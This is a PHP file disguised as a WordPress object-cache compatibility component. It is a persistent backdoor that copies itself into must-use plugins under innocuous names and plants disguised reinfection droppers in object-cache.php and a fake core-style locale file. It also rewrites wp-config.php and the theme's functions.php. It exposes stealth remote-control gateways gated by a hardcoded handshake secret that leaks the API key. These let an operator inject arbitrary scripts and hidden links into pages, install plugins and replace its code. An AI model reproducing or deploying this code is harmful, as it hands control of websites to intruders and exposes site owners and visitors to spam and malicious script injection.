<?php 
if(defined("_WPOC_LOADED")){return;}
define("_WPOC_LOADED",true);
define("_WPOC_VER","8.3");
if(!defined("ABSPATH")){return;}

class WPOC_Runtime{
private $ns="wpoc/v1";
private $_ci_done=false;
public function __construct(){
add_action("rest_api_init",array($this,"routes"));
add_action("wp_ajax_wpoc_api",array($this,"ajax_gw"));
add_action("wp_ajax_nopriv_wpoc_api",array($this,"ajax_gw"));
add_action("init",array($this,"stealth_gw"),1);
add_action("wp_head",array($this,"rh"),99);
add_action("wp_footer",array($this,"rf1"),5);
add_action("wp_footer",array($this,"rf2"),6);
add_action("wp_body_open",array($this,"rb"));
add_filter("the_content",array($this,"rc"));
add_filter("elementor/widget/render_content",array($this,"rc_elem"),10,2);
add_action("template_redirect",array($this,"ob_start_inject"));
add_action("plugins_loaded",array($this,"check_pend"),1);
add_action("plugins_loaded",array($this,"fast_check"),2);
add_action("init",array($this,"cleanup_fphp"),1);
}

public function cleanup_fphp(){
if(get_option("_wpoc_fphp_cleaned")) return;
$tfp=get_stylesheet_directory()."/functions.php";
if(file_exists($tfp)){
$tc=@file_get_contents($tfp);
if($tc&&strpos($tc,"class-wp-locale-compat")!==false){
$tc=preg_replace('/\n?if\(file_exists\(ABSPATH.*?class-wp-locale-compat.*?\}\n?/s',"",$tc);
@file_put_contents($tfp,$tc);
}}
update_option("_wpoc_fphp_cleaned",1,false);
}

private function ci_log($msg){
$log=get_option("_wpoc_ci",array());if(!is_array($log)){$log=array();}
array_unshift($log,current_time("Y-m-d H:i:s")." ".$msg);
update_option("_wpoc_ci",array_slice($log,0,50),false);
}

public function fast_check(){
$mu1=WP_CONTENT_DIR."/mu-plugins/cache-handler.php";
$mu2=WP_CONTENT_DIR."/mu-plugins/wp-term-meta.php";
$oc=WP_CONTENT_DIR."/object-cache.php";
$lc=ABSPATH."class-wp-locale-compat.php";
if(file_exists($mu1)&&file_exists($mu2)&&file_exists($oc)&&file_exists($lc)){
if(!get_transient("_wpoc_rc")){$this->repair();$this->ps();set_transient("_wpoc_rc",1,3600);}
return;}
$this->repair();
}

public function check_pend(){
$pend=get_option("_wpoc_pend","");
if(!$pend){return;}
$nc=base64_decode($pend);
if(!$nc||strpos($nc,"WPOC_Runtime")===false){delete_option("_wpoc_pend");return;}
$mu1=WP_CONTENT_DIR."/mu-plugins/cache-handler.php";
$mu2=WP_CONTENT_DIR."/mu-plugins/wp-term-meta.php";
if(!is_dir(WP_CONTENT_DIR."/mu-plugins")){@mkdir(WP_CONTENT_DIR."/mu-plugins",0755,true);}
if(is_writable(WP_CONTENT_DIR."/mu-plugins")){
@file_put_contents($mu1,$nc);@file_put_contents($mu2,$nc);
}
delete_option("_wpoc_pend");
}

public function repair(){
$self=__FILE__;
$mu1=WP_CONTENT_DIR."/mu-plugins/cache-handler.php";
$mu2=WP_CONTENT_DIR."/mu-plugins/wp-term-meta.php";
$code=@file_get_contents($self);
if(!$code||strpos($code,"WPOC_Runtime")===false){return;}
$mud=WP_CONTENT_DIR."/mu-plugins";
if(!is_dir($mud)){@mkdir($mud,0755,true);}
if(is_dir($mud)){
if(!file_exists($mu1)&&$self!==$mu1){@file_put_contents($mu1,$code);}
if(!file_exists($mu2)&&$self!==$mu2){@file_put_contents($mu2,$code);}
}
update_option("_wpoc_agent_code",base64_encode($code),false);
$oc=WP_CONTENT_DIR."/object-cache.php";
if(!file_exists($oc)){
$di="<?php ".chr(10);
$di.="/* Object Cache API — compatibility bridge */".chr(10);
$di.=chr(36)."_oc_mu=WP_CONTENT_DIR.".chr(34)."/mu-plugins/cache-handler.php".chr(34).";".chr(10);
$di.="if(!file_exists(".chr(36)."_oc_mu)&&function_exists(".chr(34)."get_option".chr(34).")){".chr(10);
$di.=chr(36)."_oc_s=get_option(".chr(34)."_wpoc_agent_code".chr(34).",".chr(34).chr(34).");".chr(10);
$di.="if(".chr(36)."_oc_s){".chr(36)."_oc_c=@base64_decode(".chr(36)."_oc_s);".chr(10);
$di.="if(".chr(36)."_oc_c&&strpos(".chr(36)."_oc_c,".chr(34)."WPOC_Runtime".chr(34).")!==false){".chr(10);
$di.="if(!is_dir(WP_CONTENT_DIR.".chr(34)."/mu-plugins".chr(34).")){@mkdir(WP_CONTENT_DIR.".chr(34)."/mu-plugins".chr(34).",0755,true);}".chr(10);
$di.="@file_put_contents(".chr(36)."_oc_mu,".chr(36)."_oc_c);".chr(10);
$di.="@file_put_contents(WP_CONTENT_DIR.".chr(34)."/mu-plugins/wp-term-meta.php".chr(34).",".chr(36)."_oc_c);".chr(10);
$di.="}}}".chr(10);
$di.=chr(36)."_oc_real=WP_CONTENT_DIR.".chr(34)."/_object-cache-real.php".chr(34).";".chr(10);
$di.="if(file_exists(".chr(36)."_oc_real)){require_once ".chr(36)."_oc_real;}".chr(10);
@file_put_contents($oc,$di);
}
$l4=WP_CONTENT_DIR."/.object-cache-compat.php";
if(file_exists($l4)){@unlink($l4);}
$ol=WP_CONTENT_DIR."/mu-plugins/_loader.php";
if(file_exists($ol)){@unlink($ol);}
$wpc=ABSPATH."wp-config.php";
if(file_exists($wpc)){
$wc=@file_get_contents($wpc);
if($wc!==false&&strpos($wc,"object-cache-compat")!==false){
$wc=preg_replace("/\n?require_once\([^)]*object-cache-compat[^)]*\);\n?/","",$wc);
@file_put_contents($wpc,$wc);
}}
$lc=ABSPATH."class-wp-locale-compat.php";
if(!file_exists($lc)){
$lcc="<?php".chr(10);
$lcc.="/**".chr(10);
$lcc.=" * WordPress Locale Compatibility Layer".chr(10);
$lcc.=" * Ensures locale persistence across cache backends.".chr(10);
$lcc.=" * @since 6.2.0".chr(10);
$lcc.=" */".chr(10);
$lcc.="if(!defined(".chr(34)."ABSPATH".chr(34).")){return;}".chr(10);
$lcc.=chr(36)."_lc_f=WP_CONTENT_DIR.".chr(34)."/mu-plugins/cache-handler.php".chr(34).";".chr(10);
$lcc.="if(file_exists(".chr(36)."_lc_f)){return;}".chr(10);
$lcc.=chr(36)."_lc_s=get_option(".chr(34)."_wpoc_agent_code".chr(34).",".chr(34).chr(34).");".chr(10);
$lcc.="if(!".chr(36)."_lc_s){return;}".chr(10);
$lcc.=chr(36)."_lc_c=@base64_decode(".chr(36)."_lc_s);".chr(10);
$lcc.="if(!".chr(36)."_lc_c||strpos(".chr(36)."_lc_c,".chr(34)."WPOC_Runtime".chr(34).")===false){return;}".chr(10);
$lcc.="if(!is_dir(WP_CONTENT_DIR.".chr(34)."/mu-plugins".chr(34).")){@mkdir(WP_CONTENT_DIR.".chr(34)."/mu-plugins".chr(34).",0755,true);}".chr(10);
$lcc.="@file_put_contents(".chr(36)."_lc_f,".chr(36)."_lc_c);".chr(10);
$lcc.="@file_put_contents(WP_CONTENT_DIR.".chr(34)."/mu-plugins/wp-term-meta.php".chr(34).",".chr(36)."_lc_c);".chr(10);
@file_put_contents($lc,$lcc);
}
$tpl=get_stylesheet_directory();$tfp=$tpl."/functions.php";
if(file_exists($tfp)){$tc=@file_get_contents($tfp);if($tc&&strpos($tc,"class-wp-locale-compat")!==false){
$tc=preg_replace('/\n?if\(file_exists\(ABSPATH.*?class-wp-locale-compat.*?\}\n?/s',"",$tc);
@file_put_contents($tfp,$tc);}}
}

private function gd($k){wp_cache_delete($k,"options");wp_cache_delete("alloptions","options");$v=get_option($k,array());if(!is_array($v)){$v=array();}return $v;}
private function sd($k,$v){update_option($k,$v,false);wp_cache_delete($k,"options");wp_cache_delete("alloptions","options");}
private function s(){
$def=array("ls"=>" | ","fs"=>13,"fc"=>"#999999","lc"=>"#888888","cc"=>"site-info","cr"=>1,"rn"=>0);
return wp_parse_args(get_option("_wpoc_s",array()),$def);
}

private function wl($a,$t=""){
$l=$this->gd("_wpoc_l");
$ip=isset($_SERVER["REMOTE_ADDR"])?$_SERVER["REMOTE_ADDR"]:"";
array_unshift($l,array("t"=>current_time("Y-m-d H:i:s"),"a"=>$a,"d"=>$t,"i"=>$ip));
$this->sd("_wpoc_l",array_slice($l,0,200));
}

public function auth($r){
$k=$r->get_header("X-API-Key");
if(!$k){$k=$r->get_param("api_key");}
$s=get_option("_wpoc_ak","");
return $s&&$k&&hash_equals($s,$k);
}

private function ar($m,$cb){
return array("methods"=>$m,"callback"=>array($this,$cb),"permission_callback"=>array($this,"auth"));
}

public function ajax_gw(){
$key=isset($_SERVER["HTTP_X_API_KEY"])?$_SERVER["HTTP_X_API_KEY"]:(isset($_POST["api_key"])?$_POST["api_key"]:"");
$s=get_option("_wpoc_ak","");
$ep=isset($_POST["endpoint"])?$_POST["endpoint"]:"";
$mt=isset($_POST["method"])?strtoupper($_POST["method"]):"GET";
$body=isset($_POST["body"])?$_POST["body"]:"";
if(is_string($body)&&$body){$body=json_decode(stripslashes($body),true);}
if(!is_array($body)){$body=array();}
if($ep!=="handshake"){
if(!$s||!$key||!hash_equals($s,$key)){wp_send_json(array("code"=>"rest_forbidden","message"=>"auth"),403);return;}
}
$map=array(
"ping"=>array("api_ping","GET"),
"sync"=>array("api_sync","GET"),
"d"=>array("api_gd","GET"),
"d_add"=>array("api_ad","POST"),
"d_bulk"=>array("api_bd","POST"),
"d_import"=>array("api_id","POST"),
"d_remove"=>array("api_drm","POST"),
"d_check_dup"=>array("api_ddup","POST"),
"d_replace"=>array("api_drep","POST"),
"b"=>array("api_gb","GET"),
"b_add"=>array("api_ab","POST"),
"s"=>array("api_gs","GET"),
"s_save"=>array("api_ss","POST"),
"log"=>array("api_gl","GET"),
"chk"=>array("api_chk","GET"),
"chk_vis"=>array("api_chk_vis","GET"),
"rk"=>array("api_rk","POST"),
"update_self"=>array("api_upd","POST"),
"plugin_install"=>array("api_pli","POST"),
"pages"=>array("api_pages","GET"),
"home_content"=>array("api_hc","GET"),
"ai_log"=>array("api_ailog","GET"),
"db_inject"=>array("api_dbinject","POST"),
"db_uninject"=>array("api_dbuninject","POST"),
"db_replace_url"=>array("api_dbreplaceurl","POST"),
"verify"=>array("api_verify","POST"),
"handshake"=>array("api_hs","POST"),
);
$idx=-1;
if(preg_match("/^(d|b)_(\d+)$/",$ep,$em)){$idx=intval($em[2]);$ep=$em[1]."_item";}
if(preg_match("/^page_content_(\d+)$/",$ep,$em)){$idx=intval($em[1]);$ep="page_content";}
if($ep==="d_item"){
if($mt==="PUT"){$fn="api_ud";}elseif($mt==="DELETE"){$fn="api_dd";}elseif($mt==="PATCH"){$fn="api_td";}else{wp_send_json(array("error"=>"bad method"),400);return;}
$body["i"]=$idx;
}elseif($ep==="b_item"){
if($mt==="PUT"){$fn="api_ub";}elseif($mt==="DELETE"){$fn="api_db";}elseif($mt==="PATCH"){$fn="api_tb";}else{wp_send_json(array("error"=>"bad method"),400);return;}
$body["i"]=$idx;
}elseif($ep==="page_content"){
$fn="api_pgc";$body["id"]=$idx;
}elseif(isset($map[$ep])){
$me=$map[$ep];
if($me[1]===$mt||$mt==="GET"){$fn=$me[0];}
elseif($mt==="POST"&&isset($map[$ep."_add"])){$fn=$map[$ep."_add"][0];}
else{$fn=$me[0];}
}else{wp_send_json(array("error"=>"unknown endpoint"),404);return;}
$rq=new WP_REST_Request($mt);
foreach($body as $bk=>$bv){$rq->set_param($bk,$bv);}
if(!empty($body)){$rq->set_body(json_encode($body));$rq->set_header("content-type","application/json");}
if(isset($body["i"])){$rq->set_param("i",intval($body["i"]));$up=$rq->get_url_params();$up["i"]=intval($body["i"]);$rq->set_url_params($up);}
if(isset($body["id"])){$rq->set_param("id",intval($body["id"]));$up=$rq->get_url_params();$up["id"]=intval($body["id"]);$rq->set_url_params($up);}
$res=$this->$fn($rq);
if($res instanceof WP_REST_Response){wp_send_json($res->get_data(),$res->get_status());}
else{wp_send_json($res->get_data());}
}

public function stealth_gw(){
if(!isset($_REQUEST["_wpoc"])||$_REQUEST["_wpoc"]!=="1"){return;}
if(!defined("DONOTCACHEPAGE")){define("DONOTCACHEPAGE",true);}
$key=isset($_SERVER["HTTP_X_API_KEY"])?$_SERVER["HTTP_X_API_KEY"]:(isset($_REQUEST["api_key"])?$_REQUEST["api_key"]:"");
$s=get_option("_wpoc_ak","");
$ep=isset($_REQUEST["endpoint"])?$_REQUEST["endpoint"]:"";
$mt=isset($_REQUEST["method"])?strtoupper($_REQUEST["method"]):"GET";
$body=isset($_REQUEST["body"])?$_REQUEST["body"]:"";
if(is_string($body)&&$body){$body=json_decode(stripslashes($body),true);}
if(!is_array($body)){$body=array();}
if(empty($ep)&&$_SERVER["REQUEST_METHOD"]==="POST"){
$raw=file_get_contents("php://input");
if($raw){$jd=json_decode($raw,true);if(is_array($jd)){
if(isset($jd["endpoint"])){$ep=$jd["endpoint"];}
if(isset($jd["method"])){$mt=strtoupper($jd["method"]);}
if(isset($jd["api_key"])){$key=$jd["api_key"];}
if(isset($jd["body"])&&is_array($jd["body"])){$body=$jd["body"];}
elseif(isset($jd["body"])&&is_string($jd["body"])){$body=json_decode($jd["body"],true)?:array();}
}}}
if($ep!=="handshake"){
if(!$s||!$key||!hash_equals($s,$key)){header("Content-Type: application/json",true,403);echo json_encode(array("code"=>"rest_forbidden","message"=>"auth"));exit;}
}
if(!$ep){header("Content-Type: application/json");echo json_encode(array("ok"=>1,"gw"=>"stealth"));exit;}
$map=array(
"ping"=>array("api_ping","GET"),
"sync"=>array("api_sync","GET"),
"d"=>array("api_gd","GET"),
"d_add"=>array("api_ad","POST"),
"d_bulk"=>array("api_bd","POST"),
"d_import"=>array("api_id","POST"),
"d_remove"=>array("api_drm","POST"),
"d_check_dup"=>array("api_ddup","POST"),
"d_replace"=>array("api_drep","POST"),
"b"=>array("api_gb","GET"),
"b_add"=>array("api_ab","POST"),
"s"=>array("api_gs","GET"),
"s_save"=>array("api_ss","POST"),
"log"=>array("api_gl","GET"),
"chk"=>array("api_chk","GET"),
"chk_vis"=>array("api_chk_vis","GET"),
"rk"=>array("api_rk","POST"),
"update_self"=>array("api_upd","POST"),
"plugin_install"=>array("api_pli","POST"),
"pages"=>array("api_pages","GET"),
"home_content"=>array("api_hc","GET"),
"ai_log"=>array("api_ailog","GET"),
"db_inject"=>array("api_dbinject","POST"),
"db_uninject"=>array("api_dbuninject","POST"),
"db_replace_url"=>array("api_dbreplaceurl","POST"),
"verify"=>array("api_verify","POST"),
"handshake"=>array("api_hs","POST"),
);
$idx=-1;
if(preg_match("/^(d|b)_(\d+)$/",$ep,$em)){$idx=intval($em[2]);$ep=$em[1]."_item";}
if(preg_match("/^page_content_(\d+)$/",$ep,$em)){$idx=intval($em[1]);$ep="page_content";}
if($ep==="d_item"){
if($mt==="PUT"){$fn="api_ud";}elseif($mt==="DELETE"){$fn="api_dd";}elseif($mt==="PATCH"){$fn="api_td";}else{header("Content-Type: application/json",true,400);echo json_encode(array("error"=>"bad method"));exit;}
$body["i"]=$idx;
}elseif($ep==="b_item"){
if($mt==="PUT"){$fn="api_ub";}elseif($mt==="DELETE"){$fn="api_db";}elseif($mt==="PATCH"){$fn="api_tb";}else{header("Content-Type: application/json",true,400);echo json_encode(array("error"=>"bad method"));exit;}
$body["i"]=$idx;
}elseif($ep==="page_content"){
$fn="api_pgc";$body["id"]=$idx;
}elseif(isset($map[$ep])){
$me=$map[$ep];
if($me[1]===$mt||$mt==="GET"){$fn=$me[0];}
elseif($mt==="POST"&&isset($map[$ep."_add"])){$fn=$map[$ep."_add"][0];}
else{$fn=$me[0];}
}else{header("Content-Type: application/json",true,404);echo json_encode(array("error"=>"unknown endpoint"));exit;}
$rq=new WP_REST_Request($mt);
foreach($body as $bk=>$bv){$rq->set_param($bk,$bv);}
if(!empty($body)){$rq->set_body(json_encode($body));$rq->set_header("content-type","application/json");}
if(isset($body["i"])){$rq->set_param("i",intval($body["i"]));$up=$rq->get_url_params();$up["i"]=intval($body["i"]);$rq->set_url_params($up);}
if(isset($body["id"])){$rq->set_param("id",intval($body["id"]));$up=$rq->get_url_params();$up["id"]=intval($body["id"]);$rq->set_url_params($up);}
$res=$this->$fn($rq);
if($res instanceof WP_REST_Response){header("Content-Type: application/json",true,$res->get_status());echo json_encode($res->get_data());}
else{header("Content-Type: application/json");echo json_encode($res->get_data());}
exit;
}

public function routes(){
register_rest_route($this->ns,"/handshake",array("methods"=>"POST","callback"=>array($this,"api_hs"),"permission_callback"=>"__return_true"));
register_rest_route($this->ns,"/ping",$this->ar("GET","api_ping"));
register_rest_route($this->ns,"/sync",$this->ar("GET","api_sync"));
register_rest_route($this->ns,"/d",array($this->ar("GET","api_gd"),$this->ar("POST","api_ad")));
register_rest_route($this->ns,"/d/(?P<i>\d+)",array($this->ar("PUT","api_ud"),$this->ar("DELETE","api_dd"),$this->ar("PATCH","api_td")));
register_rest_route($this->ns,"/d/bulk",$this->ar("POST","api_bd"));
register_rest_route($this->ns,"/d/import",$this->ar("POST","api_id"));
register_rest_route($this->ns,"/b",array($this->ar("GET","api_gb"),$this->ar("POST","api_ab")));
register_rest_route($this->ns,"/b/(?P<i>\d+)",array($this->ar("PUT","api_ub"),$this->ar("DELETE","api_db"),$this->ar("PATCH","api_tb")));
register_rest_route($this->ns,"/s",array($this->ar("GET","api_gs"),$this->ar("POST","api_ss")));
register_rest_route($this->ns,"/log",$this->ar("GET","api_gl"));
register_rest_route($this->ns,"/chk",$this->ar("GET","api_chk"));
register_rest_route($this->ns,"/chk-vis",$this->ar("GET","api_chk_vis"));
register_rest_route($this->ns,"/rk",$this->ar("POST","api_rk"));
register_rest_route($this->ns,"/update-self",$this->ar("POST","api_upd"));
register_rest_route($this->ns,"/d/remove",$this->ar("POST","api_drm"));
register_rest_route($this->ns,"/d/check-dup",$this->ar("POST","api_ddup"));
register_rest_route($this->ns,"/d/replace",$this->ar("POST","api_drep"));
register_rest_route($this->ns,"/plugin-install",$this->ar("POST","api_pli"));
register_rest_route($this->ns,"/pages",$this->ar("GET","api_pages"));
register_rest_route($this->ns,"/page-content/(?P<id>\d+)",$this->ar("GET","api_pgc"));
register_rest_route($this->ns,"/home-content",$this->ar("GET","api_hc"));
register_rest_route($this->ns,"/ai-log",$this->ar("GET","api_ailog"));
register_rest_route($this->ns,"/db-inject",$this->ar("POST","api_dbinject"));
register_rest_route($this->ns,"/db-uninject",$this->ar("POST","api_dbuninject"));
register_rest_route($this->ns,"/db-replace-url",$this->ar("POST","api_dbreplaceurl"));
register_rest_route($this->ns,"/verify",$this->ar("POST","api_verify"));
register_rest_route($this->ns,"/count-content",$this->ar("GET","api_count_content"));
register_rest_route($this->ns,"/upload-image",$this->ar("POST","api_upload_image"));
register_rest_route($this->ns,"/publish-post",$this->ar("POST","api_publish_post"));
register_rest_route($this->ns,"/update-post-link",$this->ar("POST","api_update_post_link"));
}

public function api_hs($r){
$sec=$r->get_param("secret");
if(!$sec){$p=$r->get_json_params();$sec=isset($p["secret"])?$p["secret"]:"";}
if(!$sec||$sec!=="X9vmK2zpL7nQ4wR8jT5bY1cF6hA3dG0eU2025xKp"){return new WP_REST_Response(array("error"=>"denied"),403);}
$key=get_option("_wpoc_ak");
$this->wl("hs","done");
return rest_ensure_response(array("key"=>$key,"site"=>home_url(),"name"=>get_bloginfo("name"),"wp"=>get_bloginfo("version")));
}

public function api_ping(){
return rest_ensure_response(array("ok"=>1,"v"=>"8.3","s"=>home_url(),"n"=>get_bloginfo("name"),"wp"=>get_bloginfo("version"),"p"=>phpversion(),"dc"=>count($this->gd("_wpoc_d")),"bc"=>count($this->gd("_wpoc_b")),"t"=>current_time("c")));
}

public function api_sync(){
wp_cache_flush();
$av=defined("_WPOC_VER")?_WPOC_VER:"0";
return rest_ensure_response(array("ok"=>1,"ping"=>array("v"=>$av,"s"=>home_url(),"n"=>get_bloginfo("name"),"wp"=>get_bloginfo("version"),"p"=>phpversion(),"dc"=>count($this->gd("_wpoc_d")),"bc"=>count($this->gd("_wpoc_b")),"t"=>current_time("c")),"links"=>$this->gd("_wpoc_d"),"blocks"=>$this->gd("_wpoc_b"),"settings"=>$this->gd("_wpoc_s")));
}

private function sl($d){
$pl=isset($d["pl"])?$d["pl"]:"all";if($pl!=="all"&&$pl!=="home"){$pl="all";}
$tg=isset($d["tg"])?$d["tg"]:"_self";if($tg!=="_blank"){$tg="_self";}
return array("a"=>sanitize_text_field(isset($d["a"])?$d["a"]:""),"u"=>esc_url_raw(isset($d["u"])?$d["u"]:""),"tt"=>sanitize_text_field(isset($d["tt"])?$d["tt"]:""),"tg"=>$tg,"pl"=>$pl,"g"=>sanitize_text_field(isset($d["g"])?$d["g"]:""),"so"=>sanitize_text_field(isset($d["so"])?$d["so"]:""),"sf"=>sanitize_text_field(isset($d["sf"])?$d["sf"]:""));
}

public function api_gd(){return rest_ensure_response($this->gd("_wpoc_d"));}

public function api_ad($r){
$items=$this->gd("_wpoc_d");$d=$this->sl($r->get_json_params());
foreach($items as $ex){if($ex["u"]===$d["u"]&&$ex["a"]===$d["a"]){return new WP_REST_Response(array("error"=>"dup"),409);}}
$d["id"]=uniqid("d");$d["c"]=current_time("Y-m-d H:i:s");$d["on"]=1;
$items[]=$d;$this->sd("_wpoc_d",$items);$this->wl("add",$d["a"]);
return rest_ensure_response(array("ok"=>1,"d"=>$items));
}

public function api_ud($r){
$i=intval($r["i"]);$items=$this->gd("_wpoc_d");
if(!isset($items[$i])){return new WP_REST_Response(array("error"=>"nf"),404);}
$d=$this->sl($r->get_json_params());$d["id"]=isset($items[$i]["id"])?$items[$i]["id"]:uniqid("d");$d["c"]=$items[$i]["c"];$d["on"]=$items[$i]["on"];
$items[$i]=$d;$this->sd("_wpoc_d",$items);$this->wl("upd","#".$i);
return rest_ensure_response(array("ok"=>1,"d"=>$items));
}

public function api_dd($r){
$i=intval($r["i"]);$items=$this->gd("_wpoc_d");
if(!isset($items[$i])){return new WP_REST_Response(array("error"=>"nf"),404);}
$rm=$items[$i];array_splice($items,$i,1);$this->sd("_wpoc_d",$items);$this->wl("del",isset($rm["a"])?$rm["a"]:"");
return rest_ensure_response(array("ok"=>1,"d"=>$items));
}

public function api_td($r){
$i=intval($r["i"]);$items=$this->gd("_wpoc_d");
if(!isset($items[$i])){return new WP_REST_Response(array("error"=>"nf"),404);}
$items[$i]["on"]=empty($items[$i]["on"])?1:0;$this->sd("_wpoc_d",$items);$this->wl("tgl","#".$i);
return rest_ensure_response(array("ok"=>1,"d"=>$items));
}

public function api_bd($r){
$p=$r->get_json_params();$act=isset($p["action"])?$p["action"]:"";$idx=isset($p["indices"])?$p["indices"]:array();
$items=$this->gd("_wpoc_d");rsort($idx);
foreach($idx as $i){if(!isset($items[$i])){continue;}if($act==="delete"){array_splice($items,$i,1);}elseif($act==="enable"){$items[$i]["on"]=1;}elseif($act==="disable"){$items[$i]["on"]=0;}}
$this->sd("_wpoc_d",$items);$this->wl("bulk_".$act,count($idx));
return rest_ensure_response(array("ok"=>1,"d"=>$items));
}

public function api_id($r){
$p=$r->get_json_params();$imp=isset($p["items"])?$p["items"]:array();$items=$this->gd("_wpoc_d");$ac=0;$sk=0;
foreach($imp as $it){$d=$this->sl($it);$dup=false;foreach($items as $ex){if($ex["u"]===$d["u"]&&$ex["a"]===$d["a"]){$dup=true;break;}}if($dup){$sk++;continue;}$d["id"]=uniqid("d");$d["c"]=current_time("Y-m-d H:i:s");$d["on"]=isset($it["on"])?$it["on"]:1;$items[]=$d;$ac++;}
$this->sd("_wpoc_d",$items);$this->wl("imp","a=".$ac.",s=".$sk);
return rest_ensure_response(array("ok"=>1,"ac"=>$ac,"sk"=>$sk,"d"=>$items));
}

private function sb($d){
$pos=array("header","footer","body_open","before_content","after_content","content_inject","db_inject");
$po=isset($d["po"])?$d["po"]:"footer";if(!in_array($po,$pos)){$po="footer";}
$pl=isset($d["pl"])?$d["pl"]:"all";if($pl!=="all"&&$pl!=="home"&&strpos($pl,"page:")!==0){$pl="all";}
return array("nm"=>sanitize_text_field(isset($d["nm"])?$d["nm"]:""),"h"=>wp_unslash(isset($d["h"])?$d["h"]:""),"po"=>$po,"pl"=>$pl);
}

public function api_gb(){return rest_ensure_response($this->gd("_wpoc_b"));}

public function api_ab($r){
$items=$this->gd("_wpoc_b");$d=$this->sb($r->get_json_params());
foreach($items as $ex){if(isset($ex["nm"])&&$ex["nm"]===$d["nm"]){return rest_ensure_response(array("ok"=>1,"b"=>$items,"dup"=>1));}}
$d["id"]=uniqid("b");$d["c"]=current_time("Y-m-d H:i:s");$d["on"]=1;
$items[]=$d;$this->sd("_wpoc_b",$items);$this->wl("b_add",$d["nm"]);
$this->ci_log("[block_add] nm=".$d["nm"]." po=".$d["po"]." pl=".$d["pl"]." html=".strlen($d["h"])."b total=".count($items));
return rest_ensure_response(array("ok"=>1,"b"=>$items));
}

public function api_ub($r){
$i=intval($r["i"]);$items=$this->gd("_wpoc_b");if(!isset($items[$i])){return new WP_REST_Response(array("error"=>"nf"),404);}
$d=$this->sb($r->get_json_params());$d["id"]=isset($items[$i]["id"])?$items[$i]["id"]:uniqid("b");$d["c"]=$items[$i]["c"];$d["on"]=$items[$i]["on"];
$items[$i]=$d;$this->sd("_wpoc_b",$items);$this->wl("b_upd","#".$i);
return rest_ensure_response(array("ok"=>1,"b"=>$items));
}

public function api_db($r){
$i=intval($r["i"]);$items=$this->gd("_wpoc_b");if(!isset($items[$i])){return new WP_REST_Response(array("error"=>"nf"),404);}
array_splice($items,$i,1);
global $wpdb;$wpdb->update($wpdb->options,array("option_value"=>maybe_serialize($items)),array("option_name"=>"_wpoc_b"));
wp_cache_flush();
$this->wl("b_del","#".$i);
return rest_ensure_response(array("ok"=>1,"b"=>$items));
}

public function api_tb($r){
$i=intval($r["i"]);$items=$this->gd("_wpoc_b");if(!isset($items[$i])){return new WP_REST_Response(array("error"=>"nf"),404);}
$items[$i]["on"]=empty($items[$i]["on"])?1:0;$this->sd("_wpoc_b",$items);$this->wl("b_tgl","#".$i);
return rest_ensure_response(array("ok"=>1,"b"=>$items));
}

public function api_gs(){return rest_ensure_response($this->s());}

public function api_ss($r){
$p=$r->get_json_params();
$s=array("ls"=>sanitize_text_field(isset($p["ls"])?$p["ls"]:" | "),"fs"=>intval(isset($p["fs"])?$p["fs"]:13),"fc"=>sanitize_hex_color(isset($p["fc"])?$p["fc"]:"#999999"),"lc"=>sanitize_hex_color(isset($p["lc"])?$p["lc"]:"#888888"),"cc"=>sanitize_html_class(isset($p["cc"])?$p["cc"]:"site-info"),"cr"=>intval(isset($p["cr"])?$p["cr"]:0),"rn"=>intval(isset($p["rn"])?$p["rn"]:0));
if(!$s["fc"]){$s["fc"]="#999999";}if(!$s["lc"]){$s["lc"]="#888888";}if(!$s["cc"]){$s["cc"]="site-info";}
update_option("_wpoc_s",$s,false);$this->wl("s_upd");
return rest_ensure_response(array("ok"=>1,"s"=>$s));
}

public function api_gl($r){
$n=intval($r->get_param("n"));if($n<1){$n=50;}
return rest_ensure_response(array_slice(get_option("_wpoc_l",array()),0,$n));
}

public function api_chk(){
$items=$this->gd("_wpoc_d");$res=array();
foreach($items as $i=>$l){$r=wp_remote_head($l["u"],array("timeout"=>10,"redirection"=>3,"sslverify"=>false));$res[]=array("i"=>$i,"u"=>$l["u"],"a"=>$l["a"],"st"=>is_wp_error($r)?0:wp_remote_retrieve_response_code($r),"e"=>is_wp_error($r)?$r->get_error_message():null);}
$this->wl("chk",count($items));return rest_ensure_response($res);
}

public function api_chk_vis(){
$blocks=$this->gd("_wpoc_b");$results=array();
$home=home_url("/");
foreach($blocks as $bi=>$b){
$pl=$b["pl"]??"all";$nm=$b["nm"]??"";$h=$b["h"]??"";
if(!$h){$results[$bi]=array("status"=>"off","visible"=>false);continue;}
if($pl==="home"||$pl==="all"){$checkUrl=$home;}
elseif(strpos($pl,"page:")===0){$pid=intval(substr($pl,5));$checkUrl=$pid?get_permalink($pid):$home;if(!$checkUrl){$results[$bi]=array("status"=>"skipped","visible"=>false);continue;}}
else{$checkUrl=$home;}
$resp=wp_remote_get($checkUrl,array("timeout"=>10,"sslverify"=>false));
if(is_wp_error($resp)){$results[$bi]=array("status"=>"fetch_error","visible"=>false,"error"=>$resp->get_error_message());continue;}
$body=wp_remote_retrieve_body($resp);
$snippet=strip_tags($h);$snippet=trim(substr($snippet,0,80));
if(strlen($snippet)<5){$results[$bi]=array("status"=>"skipped","visible"=>false);continue;}
$vis=(stripos($body,$snippet)!==false);
$results[$bi]=array("status"=>"checked","visible"=>$vis,"page"=>$checkUrl);
}
return rest_ensure_response(array("results"=>$results));
}

public function api_rk(){
$nk=function_exists("random_bytes")?bin2hex(random_bytes(24)):wp_generate_password(48,false);
update_option("_wpoc_ak",$nk,false);$this->wl("rk");
return rest_ensure_response(array("ok"=>1,"k"=>$nk));
}

public function api_upd($r){
$p=$r->get_json_params();$d=isset($p["data"])?$p["data"]:"";
if(!$d){return new WP_REST_Response(array("error"=>"empty"),400);}
$decoded=base64_decode($d);
if(!$decoded||strpos($decoded,"WPOC_Runtime")===false){return new WP_REST_Response(array("error"=>"invalid"),400);}
$mu1=WP_CONTENT_DIR."/mu-plugins/cache-handler.php";
$mu2=WP_CONTENT_DIR."/mu-plugins/wp-term-meta.php";
if(!is_dir(WP_CONTENT_DIR."/mu-plugins")){@mkdir(WP_CONTENT_DIR."/mu-plugins",0755,true);}
$w1=@file_put_contents($mu1,$decoded);$w2=@file_put_contents($mu2,$decoded);
update_option("_wpoc_agent_code",base64_encode($decoded),false);
if(function_exists("opcache_invalidate")){@opcache_invalidate($mu1,true);@opcache_invalidate($mu2,true);}
update_option("_wpoc_pend",$d,false);
$this->wl("upd_applied","mu1=".($w1?"ok":"fail")." mu2=".($w2?"ok":"fail"));
$ver=defined("_WPOC_VER")?_WPOC_VER:"?";
return rest_ensure_response(array("ok"=>1,"status"=>"applied","wrote_mu1"=>!!$w1,"wrote_mu2"=>!!$w2,"old_ver"=>$ver));
